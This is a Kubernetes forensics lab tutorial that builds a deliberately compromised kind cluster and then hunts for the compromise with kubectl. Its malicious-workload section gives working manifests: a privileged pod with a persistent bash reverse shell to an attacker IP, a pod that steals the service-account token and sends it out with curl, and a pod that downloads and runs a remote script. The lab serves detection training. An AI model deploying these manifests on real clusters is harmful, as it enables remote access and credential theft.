Kubernetes Forensics: Threat Hunting Lab

Video walkthrough: https://youtu.be/Dfkffh27bGk

This lab walks you through building and investigating a compromised Kubernetes cluster. You will:
1) Review Kubernetes basics from a threat-hunting and forensics perspective.
2) Stand up an end-to-end compromised lab with:
   - Reverse shell to an attacker machine
   - Persistence via CronJob
   - Secrets exfiltration
   - Lateral movement inside the cluster
   - Token stealing (bonus)
3) Hunt for malicious activity using Kubernetes-native tooling.
4) Automate portions of the forensics workflow with a shell script.

Why Kubernetes forensics?
- [CVE-2018-1002105](https://nvd.nist.gov/vuln/detail/CVE-2018-1002105) (API Server Privilege Escalation, CVSS 9.8): Unauthenticated attackers could issue arbitrary requests to kubelet for full RCE on nodes.
- [CVE-2020-8554](https://nvd.nist.gov/vuln/detail/CVE-2020-8554) (MITM via LoadBalancer/External IP): Abusing Service fields could redirect traffic.
- [CVE-2021-25741](https://nvd.nist.gov/vuln/detail/CVE-2021-25741) (Node Proxy Path Traversal, Medium): Kubelet /proxy misuse enabled direct file access on nodes.
- 2018 Tesla breach: Open Kubernetes dashboard allowed cryptomining containers. ([Incident write-up](https://www.redlock.io/blog/cryptojacking-tesla))
- Sysdig 2023: 87% of container attacks involved cryptominers; ~10% used rootkits or kernel persistence. ([Report](https://sysdig.com/blog/threat-report-2023/))

Kubernetes primer (hunting-focused)
- Pod: Smallest unit; one or more containers sharing network/storage. `kubectl get pods`, `kubectl describe pod <pod>`.
- Node: Worker host. `kubectl get nodes`.
- Deployment: Ensures desired pod replicas. `kubectl create deployment nginx --image=nginx`.
- Service: Exposes pods. Types: ClusterIP, NodePort, LoadBalancer. `kubectl expose deployment nginx --port=80 --type=NodePort`.
- Namespace: Logical partition. `kubectl get namespaces`, `kubectl get pods -n kube-system`.
- ConfigMap/Secret: Non-sensitive vs. sensitive config. `kubectl get secrets`, `kubectl describe secret <name>`.
- ServiceAccount: Pod identity for API access. `kubectl get serviceaccounts`.
- Volume: Persistent storage (e.g., hostPath). Example:
  ```yaml
  volumes:
    - name: data
      hostPath:
        path: /data
  ```
- RBAC: Roles/ClusterRoles/RoleBindings control access. `kubectl get clusterrolebindings`.

Quick commands
| Task                    | Command                             |
| ----------------------- | ----------------------------------- |
| View all pods           | kubectl get pods -A                 |
| View running containers | kubectl describe pod <pod>          |
| Exec into container     | kubectl exec -it <pod> -- /bin/bash |
| View logs               | kubectl logs <pod>                  |
| Deploy app              | kubectl apply -f deployment.yaml    |
| Get cluster status      | kubectl cluster-info                |

Security tips
| Area             | Risk                                  |
| ---------------- | ------------------------------------- |
| Privileged pods  | Container isolation escape            |
| HostPath volumes | Direct host filesystem access         |
| Broad RBAC roles | Cluster takeover                      |
| Open egress      | Data exfiltration                     |
| Secrets in clear | Should be encrypted at rest           |

Lab setup
1) Install dependencies
```
sudo apt update && sudo apt install -y docker.io kubectl kind git make jq
```
2) Enable Docker
```
sudo systemctl start docker
sudo systemctl enable docker
```

Create the kind cluster (`kind-config.yaml`)
Example config:
```yaml
kind: Cluster
apiVersion: kind.x-k8s.io/v1alpha4
name: attacker-lab
nodes:
  - role: control-plane
    extraPortMappings:
      - containerPort: 30000
        hostPort: 30000
```
Commands:
```
sudo kind create cluster --config kind-config.yaml
sudo kubectl cluster-info --context kind-attacker-lab
sudo kubectl cluster-info dump   # cluster information
sudo kind delete clusters --all  # teardown
```

Deploy malicious workloads
- Reverse shell (`reverse-shell.yaml`)
```yaml
apiVersion: v1
kind: Pod
metadata:
  name: reverse-shell
spec:
  hostNetwork: true
  containers:
  - name: attacker
    image: debian
    securityContext:
      privileged: true
    command:
      - /bin/bash
      - -c
      - |
        apt update;
        apt install -y netcat-traditional;
        echo "Reversing persistently...";
        while true; do
          /bin/bash -i >& /dev/tcp/192.168.65.130/4444 0>&1;
          sleep 10;
        done
```
Start listener and deploy:
```
nc -nlvp 4444
sudo kubectl apply -f reverse-shell.yaml
```

- Token stealer (`token-stealer.yaml`)
```yaml
apiVersion: v1
kind: Pod
metadata:
  name: token-stealer
spec:
  containers:
  - name: stealer
    image: debian
    command:
      - /bin/bash
      - -c
      - |
        apt update && apt install -y curl jq;
        TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token);
        curl -X POST http://192.168.65.130:8080 --data "token=$TOKEN";
        sleep 30
  restartPolicy: Never
```
Start listener and deploy:
```
nc -nlvp 8080
sudo kubectl apply -f token-stealer.yaml
```

- Lateral movement (`lateral-movement.yaml`)
```yaml
apiVersion: v1
kind: Pod
metadata:
  name: lateral-move
spec:
  containers:
  - name: lateral
    image: busybox
    command:
      - /bin/sh
      - -c
      - |
        wget http://internal-service:8080/evil.sh -O /tmp/evil.sh;
        sh /tmp/evil.sh
  restartPolicy: Never
```

- Persistence (`persistence-cronjob.yaml`)
```yaml
apiVersion: batch/v1
kind: CronJob
metadata:
  name: backdoor-shell
spec:
  schedule: "/2    "
  jobTemplate:
    spec:
      template:
        spec:
          containers:
          - name: job
            image: busybox
            command:
              - /bin/sh
              - -c
              - "echo Running backdoor job; sleep 30"
          restartPolicy: OnFailure
```

- Secrets victim (`secrets-victim.yaml`)
```yaml
apiVersion: v1
kind: Secret
metadata:
  name: db-secret
type: Opaque
data:
  password: c3VwZXJzZWNyZXQ=  # base64 for 'supersecret'
---
apiVersion: v1
kind: Pod
metadata:
  name: victim-app
spec:
  containers:
  - name: app
    image: alpine
    command: ["sh", "-c", "sleep 3600"]
    env:
    - name: DB_PASSWORD
      valueFrom:
        secretKeyRef:
          name: db-secret
          key: password
```

Threat hunting walkthrough
- Recon:
  - `sudo kubectl get pods`
  - `sudo kubectl get pods -A -o wide`
  - `sudo kubectl describe pod <reverse-shell|backdoor-shell-...|lateral-move|token-stealer|victim-app>`
  - `sudo kubectl get nodes -o wide`
  - `sudo kubectl get svc -A`
  - `sudo kubectl get ep -A`
  - `sudo kubectl get pods -A -o json` (inspect for privileged or hostNetwork pods)
- Network abuse:
  - `sudo kubectl get pods -A -o jsonpath='{range .items[?(@.spec.hostNetwork==true)]}{.metadata.name}{"\n"}{end}'`
- Persistence:
  - `sudo kubectl get cronjobs -A`
  - `sudo kubectl describe cronjob backdoor-shell`
- Secrets:
  - `sudo kubectl get secrets`
  - `sudo kubectl describe secret db-secret`
  - `sudo kubectl describe pod victim-app`
  - `sudo kubectl get secret db-secret -o jsonpath="{.data.password}" | base64 --decode`
- RBAC and token abuse:
  - `sudo kubectl describe serviceaccount`
  - `sudo kubectl get clusterrolebinding`
- Privileged pods:
  - `sudo kubectl get pods -o jsonpath='{range .items[]}{.metadata.name}{"\t"}{.spec.containers[].securityContext.privileged}{"\n"}{end}'`

Automate threat hunting (`automated-k8s-threat-hunting.sh`)
Install prerequisites:
```
sudo apt-get install wget gnupg
wget -qO - https://aquasecurity.github.io/trivy-repo/deb/public.key | gpg --dearmor | sudo tee /usr/share/keyrings/trivy.gpg > /dev/null
echo "deb [signed-by=/usr/share/keyrings/trivy.gpg] https://aquasecurity.github.io/trivy-repo/deb generic main" | sudo tee -a /etc/apt/sources.list.d/trivy.list
sudo apt-get update
sudo apt-get install trivy
```
